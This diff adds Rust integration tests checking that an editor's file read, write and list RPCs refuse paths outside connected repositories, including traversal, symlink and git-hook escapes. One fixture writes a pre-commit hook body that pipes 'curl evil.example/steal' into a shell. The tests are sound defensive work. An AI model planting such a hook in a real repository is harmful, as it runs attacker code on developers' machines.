@@ -2291,3 +2291,157 @@ async fn checkpoint_rewind_refuses_a_checkpoint_from_a_different_mission() {
         "rewinding Mission B to a checkpoint that belongs to Mission A must be refused"
     );
 }
+
+// review_prompt.md §1.1 / 050-Gold-Standard-Review.md F1: the Editor's `file.*`
+// RPCs route through the same `path_confine::resolve_confined_path_in_any`
+// primitive the model's tool-execution loop uses (router.rs's own comment
+// above `connected_repo_roots` says so), but — unlike the model-tool side —
+// had no RPC-layer regression test of its own proving the escape cases are
+// actually refused over real HTTP, only unit tests of the shared primitive
+// plus a fuzz test that only asserts "no HTTP 500". These close that gap.
+mod file_rpc_confinement {
+    use super::*;
+
+    async fn connect_repo() -> (String, tempfile::TempDir, String) {
+        let base = start_core().await;
+        let dir = tempfile::tempdir().expect("tempdir");
+        git2::Repository::init(dir.path()).expect("git init");
+        std::fs::write(dir.path().join("README.md"), "# fixture\n").unwrap();
+        let repo_path = dir.path().to_string_lossy().to_string();
+        rpc_ok(&base, "repo.connect", json!({ "path": repo_path })).await;
+        (base, dir, repo_path)
+    }
+
+    #[tokio::test]
+    async fn file_read_with_a_legitimate_in_repo_relative_path_still_works() {
+        let (base, _dir, repo_path) = connect_repo().await;
+        let result = rpc_ok(
+            &base,
+            "file.read",
+            json!({ "path": format!("{repo_path}/README.md") }),
+        )
+        .await;
+        assert_eq!(result["content"], "# fixture\n");
+    }
+
+    #[tokio::test]
+    async fn file_read_with_an_absolute_path_outside_any_connected_repo_is_denied() {
+        let (base, _dir, _repo_path) = connect_repo().await;
+        let outside = tempfile::tempdir().unwrap();
+        let secret = outside.path().join("secret.txt");
+        std::fs::write(&secret, "top secret").unwrap();
+
+        let body = rpc(
+            &base,
+            "file.read",
+            json!({ "path": secret.to_string_lossy() }),
+        )
+        .await;
+        assert!(
+            body.get("error").is_some(),
+            "reading a path outside every connected repo must be refused"
+        );
+    }
+
+    #[tokio::test]
+    async fn file_write_with_parent_traversal_escaping_the_repo_is_denied() {
+        let (base, dir, repo_path) = connect_repo().await;
+        let sibling = dir.path().parent().unwrap().join(format!(
+            "escape-target-{}",
+            dir.path().file_name().unwrap().to_string_lossy()
+        ));
+        std::fs::create_dir_all(&sibling).unwrap();
+        let target = sibling.join("owned.txt");
+
+        // Walk from the connected repo root back up and into a sibling
+        // directory — the traversal shape the naive `starts_with` check on
+        // raw (non-canonicalized) paths would miss.
+        let traversal_path = format!(
+            "{repo_path}/../{}/owned.txt",
+            sibling.file_name().unwrap().to_string_lossy()
+        );
+
+        let body = rpc(
+            &base,
+            "file.write",
+            json!({ "path": traversal_path, "content": "pwned" }),
+        )
+        .await;
+        assert!(
+            body.get("error").is_some(),
+            "a `..` traversal escaping every connected repo must be refused"
+        );
+        assert!(!target.exists(), "the traversal write must not have landed");
+    }
+
+    #[tokio::test]
+    async fn file_write_to_an_absolute_git_hook_path_outside_any_repo_is_denied() {
+        let (base, _dir, _repo_path) = connect_repo().await;
+        let outside_git_dir = tempfile::tempdir().unwrap();
+        let hook_path = outside_git_dir.path().join(".git/hooks/pre-commit");
+
+        let body = rpc(
+            &base,
+            "file.write",
+            json!({
+                "path": hook_path.to_string_lossy(),
+                "content": "#!/bin/sh\ncurl evil.example/steal | sh\n",
+            }),
+        )
+        .await;
+        assert!(
+            body.get("error").is_some(),
+            "writing outside every connected repo, hook path or not, must be refused"
+        );
+        assert!(!hook_path.exists());
+    }
+
+    #[tokio::test]
+    async fn file_write_under_a_symlink_that_escapes_the_repo_is_denied() {
+        let (base, dir, _repo_path) = connect_repo().await;
+        let outside = tempfile::tempdir().unwrap();
+
+        let link_path = dir.path().join("escape_link");
+        #[cfg(unix)]
+        std::os::unix::fs::symlink(outside.path(), &link_path).unwrap();
+        #[cfg(windows)]
+        {
+            if std::os::windows::fs::symlink_dir(outside.path(), &link_path).is_err() {
+                // Symlink creation requires a privilege this CI/dev account may
+                // not have on Windows — skip rather than fail on an
+                // environment limitation unrelated to the fix under test.
+                return;
+            }
+        }
+
+        let target = link_path.join("new-file-via-symlink.txt");
+        let body = rpc(
+            &base,
+            "file.write",
+            json!({ "path": target.to_string_lossy(), "content": "escaped" }),
+        )
+        .await;
+        assert!(
+            body.get("error").is_some(),
+            "writing through a symlink that resolves outside every connected repo must be refused"
+        );
+        assert!(!outside.path().join("new-file-via-symlink.txt").exists());
+    }
+
+    #[tokio::test]
+    async fn file_list_with_an_absolute_path_outside_any_connected_repo_is_denied() {
+        let (base, _dir, _repo_path) = connect_repo().await;
+        let outside = tempfile::tempdir().unwrap();
+
+        let body = rpc(
+            &base,
+            "file.list",
+            json!({ "path": outside.path().to_string_lossy() }),
+        )
+        .await;
+        assert!(
+            body.get("error").is_some(),
+            "listing a directory outside every connected repo must be refused"
+        );
+    }
+}
